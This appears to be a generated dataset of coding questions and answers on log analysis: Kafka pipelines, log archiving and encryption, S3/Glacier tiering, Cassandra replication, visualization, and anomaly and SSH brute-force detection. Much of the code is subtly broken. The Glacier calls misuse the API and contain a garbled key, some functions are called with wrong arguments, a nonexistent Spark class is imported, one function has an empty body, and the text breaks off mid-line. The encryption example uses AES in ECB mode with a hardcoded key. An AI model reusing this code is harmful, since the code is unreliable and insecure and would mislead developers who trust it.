pipeline. The system must also support dynamic configuration updates and be able to adapt to changes in log formats on the fly.\n\nSolution:\nUse Apache Kafka, Apache Nifi, and a custom log parsing library to create a resilient log processing pipeline:\n\n1. Ingestion: Use Apache Nifi to ingest logs from various sources, handling diverse formats and routing them to the correct Kafka topic based on the detected format.\n2. Custom Parsing Library: Develop a library that can identify and parse different log formats dynamically.\n3. Processing Pipelines: Set up multiple Kafka consumers, each consuming from a specific log format topic and utilizing the custom parsing library.\n4. Dynamic Configuration: Use a configuration management tool like Consul or Zookeeper to dynamically update the parsing rules and pipeline configurations.\n\nExample code (Java, using Kafka and custom log parser):\n\n```java\nimport org.apache.kafka.clients.consumer.ConsumerRecord;\nimport org.apache.kafka.clients.consumer.ConsumerRecords;\nimport org.apache.kafka.clients.consumer.KafkaConsumer;\nimport org.customlogparser.LogParser;\n\npublic class LogConsumer implements Runnable {\n    private final KafkaConsumer<String, String> consumer;\n    private final LogParser logParser;\n\n    public LogConsumer(KafkaConsumer<String, String> consumer, LogParser logParser) {\n        this.consumer = consumer;\n        this.logParser = logParser;\n    }\n\n    @Override\n    public void run() {\n        while (true) {\n            ConsumerRecords<String, String> records = consumer.poll(Duration.ofMillis(100));\n            for (ConsumerRecord<String, String> record : records) {\n                try {\n                    LogFormat format = logParser.detectFormat(record.value());\n                    if (format != null) {\n                        Map<String, Object> parsedLog = logParser.parse(record.value(), format);\n                        // Process and route the parsed log based on format\n                    } else {\n                        // Handle unknown format, maybe send to a dedicated error topic\n                    }\n                } catch (Exception e) {\n                    // Handle parsing errors\n                }\n            }\n        }\n    }\n}\n```\nNote: The examples provided are high-level and simplified. A complete, production-ready solution would require additional components and considerations, such as error handling, monitoring, and performance optimization."}, {"L2_TASK": "Log Analysis (Text -> Text)", "L3_TASK": "Log archiving strategies", "Complexity_Level": "medium", "Response": "Question 1: A software company needs to develop a log archiving strategy that efficiently stores logs on disk while ensuring data durability. They want to compress logs to reduce storage space and implement a rotation policy based on the log age. Develop a Python script that compresses logs older than 30 days and moves them to an archive folder.\n\n```python\nimport os\nimport gzip\nimport shutil\nimport time\nfrom datetime import datetime, timedelta\n\ndef compress_and_rotate_logs(log_folder, archive_folder, max_age_days=30):\n    for filename in os.listdir(log_folder):\n        if filename.endswith('.log'):\n            file_path = os.path.join(log_folder, filename)\n            file_stat = os.stat(file_path)\n            file_age = time.time() - file_stat.st_mtime\n\n            if file_age > max_age_days * 24 * 60 * 60:\n                compressed_file = f\"{os.path.splitext(filename)[0]}.gz\"\n                with open(file_path, 'rb') as f_in:\n                    with gzip.open(os.path.join(archive_folder, compressed_file), 'wb') as f_out:\n                        shutil.copyfileobj(f_in, f_out)\n                os.remove(file_path)\n\nlog_folder = \"/path/to/logs\"\narchive_folder = \"/path/to/archive\"\ncompress_and_rotate_logs(log_folder, archive_folder)\n```\nConcept: File Handling, Date and Time Manipulation, Compression (gzip)\n\nQuestion 2: A log management system requires archiving logs in a compressed format and encrypting them for added security. Write a Java program that encrypts compressed log files using AES encryption before transferring them to an archive location.\n\n```java\nimport java.io.*;\nimport java.nio.file.*;\nimport java.security.*;\nimport javax.crypto.*;\nimport javax.crypto.spec.*;\n\npublic class LogArchiving {\n    public static void encryptAndArchive(String logFolder, String archiveFolder, String encryptionKey) throws Exception {\n        byte[] keyBytes = encryptionKey.getBytes();\n        SecretKeySpec keySpec = new SecretKeySpec(keyBytes, \"AES\");\n        Cipher cipher = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n\n        Files.list(Paths.get(logFolder)).forEach(logFilePath -> {\n            if (logFilePath.toString().endsWith(\".gz\")) {\n                try {\n                    byte[] encryptedBytes = encryptFile(logFilePath.toString(), keySpec, cipher);\n                    Path encryptedFilePath = Paths.get(archiveFolder, logFilePath.getFileName());\n                    Files.write(encryptedFilePath, encryptedBytes);\n                    Files.delete(logFilePath);\n                } catch (Exception e) {\n                    System.err.println(\"Error processing file: \" + logFilePath);\n                    e.printStackTrace();\n                }\n            }\n        });\n    }\n\n    private static byte[] encryptFile(String filePath, SecretKeySpec keySpec, Cipher cipher) throws Exception {\n        FileInputStream fis = new FileInputStream(filePath);\n        BufferedInputStream bis = new BufferedInputStream(fis);\n        ByteArrayOutputStream encryptedBytesOutputStream = new ByteArrayOutputStream();\n        CipherOutputStream cos = new CipherOutputStream(encryptedBytesOutputStream, cipher);\n\n        cipher.init(Cipher.ENCRYPT_MODE, keySpec);\n\n        byte[] buffer = new byte[1024];\n        int read;\n        while ((read = bis.read(buffer)) != -1) {\n            cos.write(buffer, 0, read);\n        }\n\n        cos.close();\n        bis.close();\n        fis.close();\n\n        return encryptedBytesOutputStream.toByteArray();\n    }\n\n    public static void main(String[] args) throws Exception {\n        String logFolder = \"/path/to/logs\";\n        String archiveFolder = \"/path/to/archive\";\n        String encryptionKey = \"mySuperSecretKey12345\";\n        encryptAndArchive(logFolder, archiveFolder, encryptionKey);\n    }\n}\n```\nConcept: File Handling, Encryption (AES)"}, {"L2_TASK": "Log Analysis (Text -> Text)", "L3_TASK": "Log archiving strategies", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nProblem: Develop a log archiving system that implements a tiered storage strategy, where logs are automatically moved from high-speed storage to cold storage based on their age and importance. The system should also support a disaster recovery mechanism.\n\nConcept: Log Analysis (Text -> Text), Log archiving strategies, Data archiving, Disaster recovery\n\nSolution:\nIn this solution, we will use Python and the AWS S3 and Glacier services for storage. The system will categorize logs by their importance (using a custom importance level assigned during logging) and move them to different storage tiers based on age and importance. A DynamoDB table will be used to store metadata for quick recovery.\n\n```python\nimport boto3\nimport datetime\nfrom dateutil.relativedelta import relativedelta\nimport json\n\ndef archive_logs(logs, importance_levels):\n    s3 = boto3.client('s3')\n    glacier = boto3.client('glacier')\n    dynamodb = boto3.resource('dynamodb')\n    table = dynamodb.Table('LogMetadata')\n\n    for log, importance in logs.items():\n        log_age = datetime.datetime.now() - importance['timestamp']\n        if importance['level'] == 'CRITICAL' or log_age > relativedelta(months=1):\n            # Move to Glacier\n            vault_name = 'critical_vault' if importance['level'] == 'CRITICAL' else 'old_vault'\n            upload_id = glacier.create_vault(vault_name=vault_name)['vaultARN']\n            archive_id = glacier.upload_archive(vault_name, log, description=log, archive_id=upload_id)['archiveId']\n            table.put_item(Item={\n                'LogId': log,\n                'Vault': vault_name,\n                'ArchiveId': archive_id,\n                'Timestamp': importance['timestamp'].isoformat(),\n                'Level': importance['level']\n            })\n        else:\n            # Move to S3\n            bucket_name = 'recent_logs'\n            s3.upload_fileobj(open(log, 'rb'), bucket_name, log)\n            table.put_item(Item={\n                'LogId': log,\n                'Bucket': bucket_name,\n                'Key': log,\n                'Timestamp': importance['timestamp'].isoformat(),\n                'Level': importance['level']\n            })\n\ndef restore_logs(log_ids):\n    s3 = boto3.client('s3')\n    glacier = boto3.client('glacier')\n    dynamodb = boto3.resource('dynamodb')\n    table = dynamodb.Table('LogMetadata')\n\n    for log_id in log_ids:\n        response = table.get_item(Key={'LogId': log_id})\n        item = response['Item']\n        if item['Vault']:\n            # Restore from Glacier\n            job_id = glacier.initiate_job(vault_name=item['Vault'], jobParameters={\n                'Type': 'archive-retrieval',\n                'ArchiveId': item['ArchiveId']\n            })['jobId']\n            waiter = glacier.get_waiter('job_completed_or_failed')\n            waiter.wait(vaultName=item['Vault'], jobId=job_id)\n            output = glacier.describe_job(vaultName=item['Vault'], jobId=job_id)['outputLocation']\n            s3.download_file(output[' pr\u00e9 signs'], item['LogId'], f'/tmp/{item[\"LogId\"]}')\n            s3.upload_file(f'/tmp/{item[\"LogId\"]}', bucket_name, item['LogId'])\n        else:\n            # Retrieve from S3\n            s3.download_file(item['Bucket'], item['Key'], f'/tmp/{item[\"LogId\"]}')\n            s3.upload_file(f'/tmp/{item[\"LogId\"]}', bucket_name, item['LogId'])\n\n# Example usage\nlogs = {\n    'log1.txt': {'timestamp': datetime.datetime.now() - relativedelta(days=2), 'level': 'CRITICAL'},\n    'log2.txt': {'timestamp': datetime.datetime.now() - relativedelta(days=10), 'level': 'INFO'}\n}\narchive_logs(logs.items())\nrestore_logs(['log1.txt', 'log2.txt'])\n```\n\nQuestion 2:\nProblem: Design a distributed log analysis system that can handle massive amounts of real-time log data, perform complex event correlation, and ensure data durability by replicating logs in three different geographically distributed data centers. The system should also have the ability to recover from data center failures.\n\nConcept: Log Analysis (Text -> Text), Log archiving strategies, Distributed systems, Data replication, Event correlation\n\nSolution:\nIn this solution, we will use Apache Kafka, Apache Spark, and Apache Cassandra for a distributed log analysis system. Kafka will handle real-time log ingestion, Spark will perform complex event correlation, and Cassandra will store and replicate the logs across data centers.\n\n```python\nfrom kafka import KafkaProducer\nfrom pyspark.sql import SparkSession\nfrom cassandra.cluster import Cluster\nfrom cassandra.auth import PlainTextAuthProvider\n\n# Log ingestion using Apache Kafka\nproducer = KafkaProducer(bootstrap_servers=['datacenter1-kafka:9092', 'datacenter2-kafka:9092', 'datacenter3-kafka:9092'])\nfor log_entry in generate_logs():\n    producer.send('log_topic', key=log_entry['id'].encode(), value=json.dumps(log_entry).encode())\n\n# Event correlation using Apache Spark\nspark = SparkSession.builder.appName('LogAnalysis').getOrCreate()\ndf = spark \\\n    .readStream \\\n    .format('kafka') \\\n    .option('kafka.bootstrap.servers', 'datacenter1-kafka:9092,datacenter2-kafka:9092,datacenter3-kafka:9092') \\\n    .option('subscribe', 'log_topic') \\\n    .load()\ncorrelated_events = df.selectExpr(\"cast(value as string)\") \\\n                      .map(lambda x: json.loads(x)) \\\n                      .filter(lambda x: x['event_type'] == 'critical') \\\n                      .writeStream \\\n                      .format('console') \\\n                      .outputMode('append') \\\n                      .start()\n\n# Data storage and replication using Apache Cassandra\nauth_provider = PlainTextAuthProvider(username='cassandra_user', password='cassandra_password')\ncluster = Cluster(['datacenter1-cassandra:9042', 'datacenter2-cassandra:9042', 'datacenter3-cassandra:9042'], auth_provider=auth_provider)\nsession = cluster.connect()\n\nsession.execute(\"\"\"\nCREATE KEYSPACE IF NOT EXISTS log_analytics\nWITH replication = {'class': 'NetworkTopologyStrategy', 'datacenter1': '3', 'datacenter2': '3', 'datacenter3': '3'}\n\"\"\")\n\nsession.execute(\"\"\"\nCREATE TABLE IF NOT EXISTS log_analytics.logs (\n    id uuid PRIMARY KEY,\n    timestamp timestamp,\n    event_type text,\n    details map<text, text>\n) WITH replication = {'class': 'NetworkTopologyStrategy', 'datacenter1': '3', 'datacenter2': '3', 'datacenter3': '3'}\n\"\"\")\n\ndef write_to_cassandra(df):\n    df.rdd.foreachPartition(lambda it: [session.execute(\"INSERT INTO log_analytics.logs (id, timestamp, event_type, details) VALUES (%s, %s, %s, %s)\", (log_entry['id'], log_entry['timestamp'], log_entry['event_type'], log_entry['details'])) for log_entry in it])\n\nquery = df.writeStream.foreach(write_to_cassandra).start()\n\n# Example recovery from data center failures\ndef recover_data_center(failed_data_center):\n    # Reconfigure Kafka to remove failed data center\n    # Reconfigure Spark to read from remaining data centers\n    # Reconfigure Cassandra to read/write to surviving replicas\n\n# Recovery logic implementation based on the specific architecture and failover policies\n```\n\nNote: The Python code is a high-level representation and would require additional error handling, configuration, and integration with the actual distributed systems."}, {"L2_TASK": "Log Analysis (Text -> Text)", "L3_TASK": "Log data visualization", "Complexity_Level": "medium", "Response": "Concept: Log Data Visualization\n\nProblem: A software company wants to analyze and visualize log data to identify common error patterns and server performance issues. They need a medium-level solution to create a bar chart showing the top 10 most frequent error types and a line chart displaying server response time over a day.\n\nSolution 1: Python with matplotlib and pandas\n```python\nimport pandas as pd\nimport matplotlib.pyplot as plt\n\n# Step 1: Parse log data\ndef parse_log_data(log_file):\n    errors = {}\n    with open(log_file, 'r') as f:\n        for line in f:\n            if 'ERROR' in line:\n                error_type = line.split(' ')[-1]\n                errors[error_type] = errors.get(error_type, 0) + 1\n    return errors\n\n# Step 2: Create a bar chart for top 10 error types\ndef plot_top_errors(errors):\n    top_errors = dict(sorted(errors.items(), key=lambda x: x[1], reverse=True)[:10])\n    labels, values = zip(*top_errors.items())\n    plt.bar(labels, values)\n    plt.title('Top 10 Most Frequent Error Types')\n    plt.xlabel('Error Types')\n    plt.ylabel('Frequency')\n    plt.show()\n\n# Step 3: Extract and plot server response times\ndef plot_response_time(log_file):\n    response_times = []\n    with open(log_file, 'r') as f:\n        for line in f:\n            if 'response_time' in line:\n                response_time = float(line.split('=')[-1])\n                response_times.append(response_time)\n    response_times_df = pd.DataFrame(response_times, columns=['Response Time'])\n    response_times_df['Time'] = pd.date_range(start='00:00', end='23:59', freq='1H')\n    response_times_df.plot(x='Time', y='Response Time', kind='line')\n    plt.title('Server Response Time Over a Day')\n    plt.xlabel('Time (HH:MM)')\n    plt.ylabel('Response Time (s)')\n    plt.show()\n\n# Example usage\nlog_file = 'server_logs.txt'\nerrors = parse_log_data(log_file)\nplot_top_errors(errors)\nplot_response_time(log_file)\n```\nThis solution uses Python with the pandas library for data manipulation and matplotlib for visualization. It first parses the log file to extract error types and their frequencies. It then plots a bar chart for the top 10 most frequent error types and a line chart showing the server response time over a day.\n\nSolution 2: JavaScript with D3.js and PapaParse\n```javascript\n<!DOCTYPE html>\n<html>\n<head>\n    <script src=\"https://d3js.org/d3.v6.min.js\"></script>\n    <script src=\"https://cdnjs.cloudflare.com/ajax/libs/PapaParse/5.3.0/papaparse.min.js\"></script>\n</head>\n<body>\n    <script>\n        // Step 1: Parse log data\n        async function parseLogData(logFile) {\n            const response = await fetch(logFile);\n            const csvData = await response.text();\n            const parsedData = Papa.parse(csvData, { header: false }).data;\n            return parsedData;\n        }\n\n        // Step 2: Create a bar chart for top 10 error types\n        function plotTopErrors(data) {\n            const errorCounts = d3.rollup(data, v => v.length, d => d[1]);\n            const topErrors = d3.entries(errorCounts).sort((a, b) => b.value - a.value).slice(0, 10);\n            const xScale = d3.scaleBand().domain(topErrors.map(d => d.key)).range([0, 500]).padding(0.2);\n            const yScale = d3.scaleLinear().domain([0, d3.max(topErrors, d => d.value)]).range([500, 0]);\n            const svg = d3.select('body').append('svg').attr('width', 600).attr('height', 600);\n            svg.selectAll('rect')\n                .data(topErrors)\n                .enter()\n                .append('rect')\n                .attr('x', d => xScale(d.key))\n                .attr('y', d => yScale(d.value))\n                .attr('width', xScale.bandwidth())\n                .attr('height', d => yScale(0) - yScale(d.value))\n                .attr('fill', 'steelblue');\n        }\n\n        // Step 3: Extract and plot server response times\n        function plotResponseTime(data) {\n            data = data.map(d => Number(d[1]));\n            const xScale = d3.scaleTime().domain(d3.extent(data, d => new Date(d * 1000))).range([0, 500]);\n            const yScale = d3.scaleLinear().domain([0, d3.max(data)]).range([500, 0]);\n            const svg = d3.select('body').append('svg').attr('width', 600).attr('height', 600);\n            svg.append('g').attr('transform', 'translate(0, 500)').call(d3.axisBottom(xScale));\n            svg.append('g').call(d3.axisLeft(yScale));\n            svg.append('path')\n                .datum(data)\n                .attr('fill', 'none')\n                .attr('stroke', 'steelblue')\n                .attr('stroke-width', 1.5)\n                .attr('d', d3.line().x(d => xScale(new Date(d * 1000))).y(d => yScale(d)));\n        }\n\n        // Example usage\n        parseLogData('server_logs.csv').then(data => {\n            plotTopErrors(data);\n            plotResponseTime(data);\n        });\n    </script>\n</body>\n</html>\n```\nThis solution uses JavaScript with D3.js for data visualization and PapaParse to parse CSV log data. It follows a similar logic as the Python solution, parsing the log data, creating a bar chart for the top 10 error types, and a line chart for server response times. The log file is assumed to be in CSV format with each row containing a timestamp and an error message."}, {"L2_TASK": "Log Analysis (Text -> Text)", "L3_TASK": "Log data visualization", "Complexity_Level": "extremely difficult", "Response": "Area: Log Analysis (Text -> Text)\nSub Area: Log data visualization\n\nQuestion 1:\nDesign a real-time interactive log data visualization dashboard that can handle massive amounts of log data (e.g., millions of log events per second) in a distributed environment. The dashboard must provide advanced visualizations like heatmaps, sankey diagrams, and scatterplots to analyze errors, performance bottlenecks, and correlation patterns across various services.\n\nSolution:\nConcept: Distributed Stream Processing, Real-time Data Visualization, Log Parsing\n\nWe can use Apache Kafka as a message broker to handle high-volume log data, Apache Flink for distributed stream processing, and a frontend framework like React for real-time visualization. Here's an outline of the solution:\n\n1. Ingest logs into Kafka:\n```java\n// Java code for a simple Kafka producer\nProperties props = new Properties();\nprops.put(\"bootstrap.servers\", \"localhost:9092\");\nprops.put(\"key.serializer\", \"org.apache.kafka.common.serialization.StringSerializer\");\nprops.put(\"value.serializer\", \"org.apache.kafka.common.serialization.StringSerializer\");\n\nProducer<String, String> producer = new KafkaProducer<>(props);\nfor (LogEvent event : generateLogEvents()) {\n    producer.send(new ProducerRecord<>(\"log_events\", event.getKey(), event.getValue()));\n}\nproducer.close();\n```\n1. Process logs in real-time with Apache Flink:\n```java\n// Java code for a Flink stream processing job\nStreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();\nDataStream<String> logStream = env.addSource(new FlinkKafkaConsumer<>(\"log_events\", new SimpleStringSchema(), kafkaConfig));\n\nDataStream<ProcessedLogEvent> processedLogs = logStream\n    .map(new ParseLogFunction())\n    .keyBy(\"serviceId\")\n    .timeWindow(Time.minutes(5))\n    .reduce(new LogEventReducer());\n\nprocessedLogs.addSink(new FlinkKafkaProducer<>(\"processed_log_events\", new ProcessedLogEventSerializer(), kafkaConfig));\nenv.execute(\"Log Analysis Job\");\n```\n1. Visualize data with a React frontend:\n```javascript\n// Sample React code to fetch data and display a heatmap using D3.js\nimport React, { useEffect, useState } from 'react';\nimport * as d3 from 'd3';\nimport { fetchProcessedLogEvents } from './api';\n\nfunction LogHeatmap() {\n  const [logData, setLogData] = useState([]);\n\n  useEffect(() => {\n    async function fetchData() {\n      const data = await fetchProcessedLogEvents();\n      setLogData(data);\n    }\n    fetchData();\n  }, []);\n\n  useEffect(() => {\n    if (logData.length > 0) {\n      createHeatmap(logData);\n    }\n  }, [logData]);\n\n  function createHeatmap(logData) {\n    // Use D3.js to create a heatmap with logData, considering time, serviceId, and error rates\n  }\n\n  return <div id=\"heatmap\"></div>;\n}\n\nexport default LogHeatmap;\n```\nThis architecture allows for scalable log data processing and visualization by leveraging distributed stream processing and real-time data fetching on the frontend.\n\nQuestion 2:\nDevelop a log visualization tool that can automatically detect anomalies and patterns in log data using advanced machine learning techniques like clustering and time-series forecasting. It should also provide visual explanations to help users understand the detected anomalies.\n\nSolution:\nConcept: Anomaly Detection, Clustering, Time-series Forecasting, Explainable AI\n\nWe can use Python libraries like Pandas, TensorFlow, and Plotly for this task.\n\n1. Load and preprocess logs:\n```python\nimport pandas as pd\nimport numpy as np\n\ndef preprocess_logs(logs):\n    data = logs.apply(lambda x: x.split(\" \"))\n    df = pd.DataFrame(data, columns=[\"timestamp\", \"service\", \"status\", \"duration\", \"additional_info\"])\n    df[\"timestamp\"] = pd.to_datetime(df[\"timestamp\"])\n    df[\"duration\"] = df[\"duration\"].astype(float)\n    return df\n\nlogs_df = preprocess_logs(logs)\n```\n1. Apply anomaly detection and clustering:\n```python\nfrom sklearn.cluster import DBSCAN\nfrom sklearn.ensemble import IsolationForest\n\nanomaly_model = IsolationForest(contamination=0.05)\nanomaly_scores = anomaly_model.fit_predict(logs_df[[\"duration\"]])\n\ncluster_model = DBSCAN(eps=0.5, min_samples=10)\nclusters = cluster_model.fit_predict(logs_df[[\"duration\"]])\n\nlogs_df[\"anomaly\"] = anomaly_scores\nlogs_df[\"cluster\"] = clusters\n```\n1. Time-series forecasting:\n```python\nimport tensorflow as tf\nfrom tensorflow.keras.models import Sequential\nfrom tensorflow.keras.layers import LSTM, Dense\n\ndef build_forecasting_model(input_shape):\n    model = Sequential()\n    model.add(LSTM(32, input_shape=input_shape))\n    model.add(Dense(1))\n    model.compile(loss='mae', optimizer='adam')\n    return model\n\ndef forecast(logs_df):\n    # Split data into training and testing\n    # Create input and output sequences for LSTM\n    # Train the forecasting model\n    # Use the model to forecast durations\n\n    return forecasts\n```\n1. Visualize anomalies, clusters, and forecasts using Plotly:\n```python\nimport plotly.express as px\n\ndef visualize(logs_df, forecasts):\n    fig = px.scatter(logs_df, x=\"timestamp\", y=\"duration\", color=\"anomaly\", size=\"cluster\",\n                     hover_data=[\"service\", \"status\"], trendline=\"rolling\")\n    fig.update_layout(title=\"Anomalies and Clusters in Log Durations\")\n    fig.show()\n\n    # Add a subplot for time-series forecasts\n    # Visualize the forecasts alongside the original data\n\nvisualize(logs_df, forecasts)\n```\nThis solution combines anomaly detection, clustering, and time-series forecasting to analyze log data and provide visual explanations of detected anomalies."}, {"L2_TASK": "Log Analysis (Text -> Text)", "L3_TASK": "User behavior analysis from logs", "Complexity_Level": "medium", "Response": "\"Log Analysis (Text -> Text)\" is not a direct concept mentioned in the provided JSON, but it can be related to the \"Data Science\" category under \"Development\" since log analysis often involves data processing and extracting insights. Here are two medium difficulty problems related to user behavior analysis from logs, along with solutions using Python:\n\nQuestion 1: Identify the top 10 most active users based on the number of logins within a given period.\n\nSolution:\n```python\nimport pandas as pd\n\n# Assuming log data is in a CSV file with columns 'timestamp' and 'user_id'\nlog_data = pd.read_csv('log_data.csv')\n\n# Convert timestamp to datetime format\nlog_data['timestamp'] = pd.to_datetime(log_data['timestamp'])\n\n# Create a new column for the date\nlog_data['date'] = log_data['timestamp'].dt.date\n\n# Group by user_id and count the number of logins per date\nlogin_counts = log_data.groupby(['user_id', 'date']).size().reset_index(name='logins')\n\n# Count the total logins for each user_id\ntotal_logins = login_counts.groupby('user_id')['logins'].sum().reset_index()\n\n# Sort the total logins in descending order and select top 10\ntop_10_users = total_logins.sort_values('logins', ascending=False).head(10)\n\nprint(top_10_users)\n```\nConcept: Data Processing, Pandas DataFrame Manipulation\n\nQuestion 2: Detect anomalies in user activity by identifying sessions with an unusually high number of requests within a short duration.\n\nSolution:\n```python\nimport pandas as pd\nfrom scipy import stats\n\n# Load log data with columns 'user_id', 'timestamp', and 'request_id'\nlog_data = pd.read_csv('log_data.csv')\nlog_data['timestamp'] = pd.to_datetime(log_data['timestamp'])\n\n# Sort data by user_id and timestamp\nlog_data = log_data.sort_values(['user_id', 'timestamp'])\n\n# Group by user_id and create a session based on a time gap (e.g., 5 minutes)\nlog_data['session_id'] = log_data.groupby(['user_id'])['timestamp'].apply(lambda x: x.diff().gt('5T').cumsum())\n\n# Calculate the number of requests per session\nrequests_per_session = log_data.groupby(['user_id', 'session_id'])['request_id'].size().reset_index(name='requests')\n\n# Calculate z-score for each user's session\nrequests_per_session['z_score'] = stats.zscore(requests_per_session['requests'], ddof=1)\n\n# Identify sessions with a z-score above a threshold (e.g., 2.5) indicating anomalies\nanomalies = requests_per_session[requests_per_session['z_score'].abs() > 2.5]\n\nprint(anomalies)\n```\nConcept: Data Processing, Pandas DataFrame Manipulation, Time Series Analysis, Anomaly Detection"}, {"L2_TASK": "Log Analysis (Text -> Text)", "L3_TASK": "User behavior analysis from logs", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop an algorithm to analyze server logs and detect potential security threats by identifying unusual user behavior patterns, such as multiple failed login attempts, sequential access to sensitive files, and excessive resource consumption. The solution should have a low false positive rate and be capable of handling large log files efficiently.\n\n**Concept**: Text Processing, Machine Learning, Big Data\n\n**Solution**:\nTo solve this problem, we can use a combination of text processing, machine learning, and distributed computing. We'll first extract features from the log data, then train a machine learning model to detect anomalies. Here's an example using Python and Apache Spark for distributed processing.\n\n1. Install necessary libraries:\n```bash\npip install pyspark\npip install nltk\n```\n1. Text processing and feature extraction:\n```python\nfrom pyspark import SparkContext, SparkConf\nfrom pyspark.sql import SparkSession\nfrom pyspark.ml.feature import Tokenizer, CountVectorizer, IDF\nfrom pyspark.ml.pipeline import Pipeline\nfrom nltk.corpus import stopwords\nimport re\n\nconf = SparkConf().setAppName(\"LogAnalysis\").setMaster(\"local\")\nsc = SparkContext(conf=conf)\nspark = SparkSession.builder.appName(\"LogAnalysis\").getOrCreate()\n\ndef process_log(line):\n    # Extract features like login attempts, file access, and resource usage\n    log_data = re.search(r'(\\w+) accessed (\\S+) with result (\\w+), resource usage: (\\d+)', line)\n    if log_data:\n        user, file, result, resource_usage = log_data.groups()\n        return (user, file, result, int(resource_usage))\n    return None\n\n# Load the log file, process, and create a dataframe\nlog_rdd = sc.textFile(\"server_logs.txt\").filter(lambda x: x != '').map(process_log).filter(lambda x: x is not None)\nlog_df = log_rdd.toDF([\"user\", \"file\", \"result\", \"resource_usage\"])\n```\n1. Anomaly detection using a machine learning model (e.g., Isolation Forest):\n```python\nfrom pyspark.ml.classification import IsolationForest\n\n# Convert categorical features to numerical (if needed) and split the data into training and test sets\n# ...\n\n# Create a pipeline for feature extraction and anomaly detection\npipeline_stages = [CountVectorizer(inputCol=\"file\", outputCol=\"file_features\"), IDF(inputCol=\"file_features\", outputCol=\"file_idf\")]\npipeline = Pipeline(stages=pipeline_stages + [isolation_forest])\n\n# Train the model\nmodel = pipeline.fit(log_train_df)\n\n# Predict anomalies on the test dataset\nanomaly_scores = model.transform(log_test_df)\n\n# Identify potential security threats with high anomaly scores\n\u5a01\u80c1_df = anomaly_scores.filter(anomaly_scores.anomaly_score > threshold)\n```\n1. Filter false positives and handle large files:\nTo minimize false positives, you can apply domain-specific rules or use additional ML models for refining the results. For large log files, use Spark's distributed computing capabilities to process data in parallel across multiple nodes.\n\nQuestion 2: Create a real-time dashboard to visualize user behavior patterns from log data, allowing security analysts to monitor and respond to potential threats as they occur. The dashboard should be interactive, allowing filtering and drilling down into specific events.\n\n**Concept**: Data Visualization, Stream Processing, Web Development\n\n**Solution**:\n1. Use Apache Kafka for real-time log streaming and Apache Flink for stream processing:\n```bash\n# Start Kafka and produce logs into a topic\n# ...\n\n# Configure Flink to read logs from Kafka and apply analytics\nfrom pyflink.dataset import ExecutionEnvironment\nfrom pyflink.datastream import StreamExecutionEnvironment\nfrom pyflink.table import StreamTableEnvironment, DataTypes\nfrom pyflink.table.descriptors import Schema, Kafka, OldCsv, Json\n\nenv = StreamExecutionEnvironment.get_execution_environment()\ntable_env = StreamTableEnvironment.create(env)\n\ntable_env.connect(Kafka()\n                 .topic('server_logs')\n                 .start_from_latest()\n                 .property('bootstrap.servers', 'localhost:9092')\n                 .property('group.id', 'log_consumer_group')) \\\n    .with_format(Json()\n                 .json_schema(json_schema)\n                 .derive_schema()) \\\n    .with_schema(Schema()\n                 .field('user', DataTypes.STRING())\n                 .field('file', DataTypes.STRING())\n                 .field('result', DataTypes.STRING())\n                 .field('resource_usage', DataTypes.BIGINT())) \\\n    .register_table_source('server_logs')\n\n# Perform stream processing and emit results to a dashboard topic\n# ...\n```\n1. Use a web framework (e.g., Flask) to create a real-time dashboard that consumes the processed log data from another Kafka topic:\n```python\nfrom flask import Flask, render_template\nfrom kafka import KafkaConsumer\n\napp = Flask(__name__)\nconsumer = KafkaConsumer('dashboard_logs', bootstrap_servers=['localhost:9092'])\n\n@app.route('/')\ndef dashboard():\n    recent_logs = [log for log in consumer]\n    return render_template('dashboard.html', logs=recent_logs)\n\nif __name__ == '__main__':\n    app.run(debug=True)\n```\n1. Create an interactive dashboard using JavaScript and a visualization library like D3.js or Plotly.js:\n```html\n<!-- dashboard.html -->\n<!doctype html>\n<html>\n<head>\n    <script src=\"https://cdn.plot.ly/plotly-latest.min.js\"></script>\n</head>\n<body>\n    <div id=\"plot\"></div>\n    <script>\n        // Fetch and visualize data from the backend\n        // ...\n\n        // Add interactivity, filtering, and drilling down\n        // ...\n    </script>\n</body>\n</html>\n```\nIn this solution, Kafka provides a reliable stream of log data, Flink processes and analyzes log events in real-time, and the Flask dashboard consumes and visualizes the processed data for security analysts. The frontend can use JavaScript to create an interactive experience with filtering and drill-down capabilities."}, {"L2_TASK": "Log Analysis (Text -> Text)", "L3_TASK": "Security incident detection through logs", "Complexity_Level": "medium", "Response": "As \"Log Analysis (Text -> Text)\" and \"Security incident detection through logs\" are not explicitly mentioned in the provided JSON, I'll interpret this as a problem involving text processing and pattern recognition in log data to identify security incidents. The problem will involve using programming languages and techniques that are commonly used in such scenarios, such as Python with regular expressions and log parsing libraries.\n\nQuestion 1:\nProblem: Develop a Python script that reads log files and identifies potential SSH brute force attacks by detecting multiple failed login attempts from the same IP address within a short time frame.\n\nConcept: Text Processing, Pattern Recognition, Regular Expressions\n\n```python\nimport re\nimport collections\nfrom datetime import timedelta\n\ndef parse_log_line(line):\n    pattern = r'(\\S+) (\\S+) (\\S+) \\[([^\\]]+)\\] \\\"(\\S+) (\\S+) (\\S+)\\\" (\\d+) (\\S+) \\\"([^\\\"]*)\\\" \\\"([^\\\"]*)\\\"'\n    match = re.match(pattern, line)\n    if match:\n        return {\n            'timestamp': match.group(4),\n            'ip_address': match.group(1),\n            'username': match.group(3),\n            'action': match.group(5),\n            'status': int(match.group(7))\n        }\n    return None\n\ndef is_failed_login(log_entry):\n    return log_entry and log_entry['action'] == 'SSH' and log_entry['status'] != 200\n\ndef detect_brute_force_attacks(log_lines, threshold=5, time_window=timedelta(minutes=5)):\n    entries = [parse_log_line(line) for line in log_lines if parse_log_line(line)]\n    failed_attempts = collections.defaultdict(list)\n\n    for entry in entries:\n        if is_failed_login(entry):\n            failed_attempts[entry['ip_address']].append(entry['timestamp'])\n\n    for ip, timestamps in failed_attempts.items():\n        if len(timestamps) >= threshold:\n            latest_timestamp = max(timestamps)\n            earliest_timestamp = min(timestamps)\n            if (latest_timestamp - earliest_timestamp) <= time_window:\n                print(f'Potential brute force attack detected from IP: {ip}')\n\n# Example log lines\nlog_lines = [\n    \"192.168.1.1 user1 FailedPasswordForInvalidUser invalid /opt/ssh 535 42 /bin/login\",\n    \"192.168.1.1 user1 FailedPasswordForUser user1 /opt/ssh 535 42 /bin/login\",\n    \"192.168.1.2 user2 FailedPasswordForUser user2 /opt/ssh 535 42 /bin/login\",\n    \"192.168.1.1 user1 